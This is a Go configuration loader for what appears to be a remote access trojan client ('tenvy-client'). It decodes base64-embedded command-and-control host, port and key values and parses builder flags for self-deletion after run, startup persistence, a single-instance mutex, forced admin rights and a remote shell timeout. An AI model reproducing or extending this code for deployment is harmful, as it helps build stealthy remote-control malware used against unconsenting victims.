package main

import (
	"encoding/base64"
	"errors"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/rootbay/tenvy-client/internal/agent"
)

var (
	defaultServerHostEncoded        = ""
	defaultServerPortEncoded        = ""
	defaultInstallPathEncoded       = ""
	defaultEncryptionKeyEncoded     = ""
	defaultMeltAfterRun             = "false"
	defaultStartupOnBoot            = "false"
	defaultMutexKeyEncoded          = ""
	defaultForceAdminRequirement    = "false"
	defaultPollIntervalOverrideMs   = ""
	defaultMaxBackoffOverrideMs     = ""
	defaultShellTimeoutOverrideSecs = ""
)

func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
	serverURL := strings.TrimRight(defaultServerURL(), "/")
	if serverURL == "" {
		return agent.RuntimeOptions{}, errors.New("server url must be provided")
	}

	sharedSecret := strings.TrimSpace(fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeBase64(defaultEncryptionKeyEncoded)))
	installPath := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeBase64(defaultInstallPathEncoded))

	preferences := agent.BuildPreferences{
		InstallPath:   installPath,
		MeltAfterRun:  parseBool(defaultMeltAfterRun),
		StartupOnBoot: parseBool(defaultStartupOnBoot),
		MutexKey:      decodeBase64(defaultMutexKeyEncoded),
		ForceAdmin:    parseBool(defaultForceAdminRequirement),
	}

	timing := agent.TimingOverride{
		PollInterval: parsePositiveDurationMs(defaultPollIntervalOverrideMs),
		MaxBackoff:   parsePositiveDurationMs(defaultMaxBackoffOverrideMs),
		ShellTimeout: parsePositiveDurationSeconds(defaultShellTimeoutOverrideSecs),
	}

	return agent.RuntimeOptions{
		Logger:         logger,
		ServerURL:      serverURL,
		SharedSecret:   sharedSecret,
		Preferences:    preferences,
		Metadata:       agent.CollectMetadata(buildVersion),
		BuildVersion:   buildVersion,
		TimingOverride: timing,
	}, nil
}

func defaultServerURL() string {
	host := strings.TrimSpace(fallback(decodeBase64(defaultServerHostEncoded), "localhost"))
	port := strings.TrimSpace(fallback(decodeBase64(defaultServerPortEncoded), "2332"))

	if host == "" {
		host = "localhost"
	}

	if strings.Contains(host, "://") {
		return strings.TrimRight(host, "/")
	}

	if port == "" {
		port = "2332"
	}

	scheme := "https"
	if port == "80" {
		scheme = "http"
	}

	return scheme + "://" + host + ":" + port
}

func decodeBase64(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func parseBool(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "1", "true", "yes", "on", "enabled":
		return true
	default:
		return false
	}
}

func parsePositiveDurationMs(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Millisecond
}

func parsePositiveDurationSeconds(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Second
}

func fallback(value, fallbackValue string) string {
	if strings.TrimSpace(value) == "" {
		return fallbackValue
	}
	return value
}
